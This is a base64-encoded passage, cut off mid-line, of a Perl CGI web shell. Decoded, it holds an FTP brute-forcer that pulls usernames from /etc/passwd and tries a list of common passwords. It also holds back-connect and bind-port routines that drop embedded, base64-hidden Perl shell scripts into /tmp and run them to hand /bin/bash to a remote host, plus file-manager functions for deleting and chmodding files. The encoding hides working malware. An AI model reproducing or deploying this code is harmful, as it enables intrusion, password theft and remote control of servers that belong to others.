ZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCR1c2VybmFtZSBuZSAiIikNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCRpbnsnc2xlZXAnfSBuZSAiMCIpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pICogMTAwMCk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI2IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxMiIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJ2aW5ha2lkIj48L3RkPg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIFRlc3RpbmcgLi4uLg0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsNCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgJEZpbGUgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCglpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAiJGZpbGUiOw0KCX0NCglyZXR1cm4gIjAiOw0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBUcmltU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cL1wvL1wvL2c7DQoJJHN0cmluZz1+IHMvXFxcXC9cXC9nOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0Kc3ViIExpc3REaXINCnsNCglteSAkcGF0aCA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpci4kUGF0aFNlcCk7DQoJbXkgJHJlc3VsdCA9ICI8Zm9ybSBuYW1lPSdmJyBvblN1Ym1pdD1cIkVuY29kZXIoJ2QnKVwiIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgaWQ9J2QnIG5hbWU9J2QnIHNpemU9JzQwJyB2YWx1ZT0nJEN1cnJlbnREaXInIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYScgdmFsdWU9J2d1aSc+PGlucHV0IGNsYXNzPSdzdWJtaXQnIHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0NoYW5nZSc+PC9mb3JtPiI7DQoJaWYoLWQgJHBhdGgpDQoJew0KCQlteSBAZm5hbWUgPSAoKTsNCgkJbXkgQGRuYW1lID0gKCk7DQoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkNCgkJew0KCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCQl7DQoJCQkJJGY9JHBhdGguJGZpbGU7DQoJCQkJaWYoLWQgJGYpDQoJCQkJew0KCQkJCQlwdXNoKEBkbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCQljbG9zZWRpcihESVIpOw0KCQl9DQoJCUBmbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBmbmFtZTsNCgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOw0KCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+DQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCB3aWR0aD0nMTAwJz5GaWxlIFNpemU8L3RoPg0KCQk8dGggd2lkdGg9JzE1MCc+T3duZXI8L3RoPg0KCQk8dGggd2lkdGg9JzEwMCc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCB3aWR0aD0nMTUwJz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHdpZHRoPScyMzAnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9Im5vdGxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJbmV4dDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdkaXInPjxhICBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJGQpLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpOyByZXR1cm4gZmFsc2U7IFwiPlJlbmFtZTwvYT4gIHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZGlyOiAkZGlybmFtZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJHBhdGgpLiImcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQlteSAkYWN0aW9uID0gZW5jb2RlX2Jhc2U2NCgiZWRpdCAiLiRmaWxlKTsNCgkJCSR2aWV3ID0gIj9kaXI9Ii4kcGF0aC4iJn